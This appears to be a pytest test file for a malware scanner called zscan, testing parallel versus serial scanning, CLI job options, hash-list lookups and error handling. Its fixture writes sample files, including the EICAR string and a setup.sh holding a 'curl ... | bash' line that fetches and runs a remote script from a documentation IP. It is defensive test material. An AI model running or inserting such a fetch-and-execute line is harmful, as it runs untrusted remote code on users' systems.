import hashlib
import json
import os

import pytest

from zscan import intel
from zscan.cli import main, to_dict
from zscan.scanner import Scanner
from zscan.yara_engine import YaraEngine

from samples import EICAR, benign_pe, build_elf, make_zip, packed_like_pe


@pytest.fixture()
def tree(tmp_path):
    """A small directory with a bit of everything."""
    d = tmp_path / "tree"
    (d / "sub").mkdir(parents=True)
    files = {
        "notes.txt": b"nothing to see here",
        "eicar.com": EICAR,
        "ok.exe": benign_pe(),
        "sub/packed.exe": packed_like_pe(),
        "sub/prog": build_elf(load_flags=7, imports=("ptrace",)),
        "sub/mail.zip": make_zip({"a.txt": b"hi", "run/eicar.com": EICAR}),
        "sub/old.rar": b"Rar!\x1a\x07\x01\x00" + bytes(range(256)),
        "sub/setup.sh": b"#!/bin/sh\ncurl -s http://203.0.113.5:8080/x.sh | bash\n",
    }
    for name, data in files.items():
        (d / name).write_bytes(data)
    return d


def make_scanner(**kw):
    return Scanner(YaraEngine(community=False), **kw)


def test_parallel_results_equal_serial_results(tree):
    s = make_scanner()
    paths = list(s.iter_paths(tree))
    serial = [to_dict(r) for r in s.scan_many(paths, jobs=1)]
    parallel = [to_dict(r) for r in s.scan_many(paths, jobs=2)]
    assert len(serial) == 8
    assert parallel == serial      # same reports, in the same order


def test_cli_jobs_matches_serial(tree, capsys):
    main([str(tree), "--json", "--no-community"])
    serial = json.loads(capsys.readouterr().out)
    code = main([str(tree), "--json", "--no-community", "-j", "2"])
    parallel = json.loads(capsys.readouterr().out)
    assert code == 2
    assert parallel == serial
    assert parallel["summary"]["malicious"] >= 2


def test_jobs_zero_means_all_cores(tree, capsys):
    assert main([str(tree), "-q", "--no-color", "--no-community", "-j", "0"]) == 2
    assert "eicar.com" in capsys.readouterr().out


def test_hash_lookups_stay_in_the_main_process(tree, tmp_path):
    bad = tmp_path / "bad.txt"
    bad.write_text(hashlib.sha256(b"nothing to see here").hexdigest() + ",TestFamily\n")
    calls = []

    def fake_http(url, data=None, headers=None, timeout=15):
        calls.append(url)
        return 404, b""

    s = make_scanner(hash_list=intel.HashList([bad]), online=intel.OnlineIntel(http=fake_http, use_cache=False))
    reports = {os.path.basename(r.path): r for r in s.scan_many(list(s.iter_paths(tree)), jobs=2)}
    assert any(f.title == "Hash on known-malware list" for f in reports["notes.txt"].findings)
    assert calls and all("hashlookup.circl.lu" in u for u in calls)   # the fake saw them, so they ran here


def test_unreadable_file_is_an_error_report_not_a_crash(tmp_path):
    s = make_scanner()
    reps = list(s.scan_many([tmp_path / "gone.bin"], jobs=2))
    assert reps[0].verdict == "error" and "cannot read" in reps[0].error


def test_stopping_early_shuts_the_pool_down(tmp_path):
    for i in range(40):
        (tmp_path / f"f{i}.txt").write_text(f"file {i}")
    s = make_scanner()
    gen = s.scan_many(list(s.iter_paths(tmp_path)), jobs=2)
    next(gen)
    gen.close()    # must return promptly instead of waiting for the other 39 files
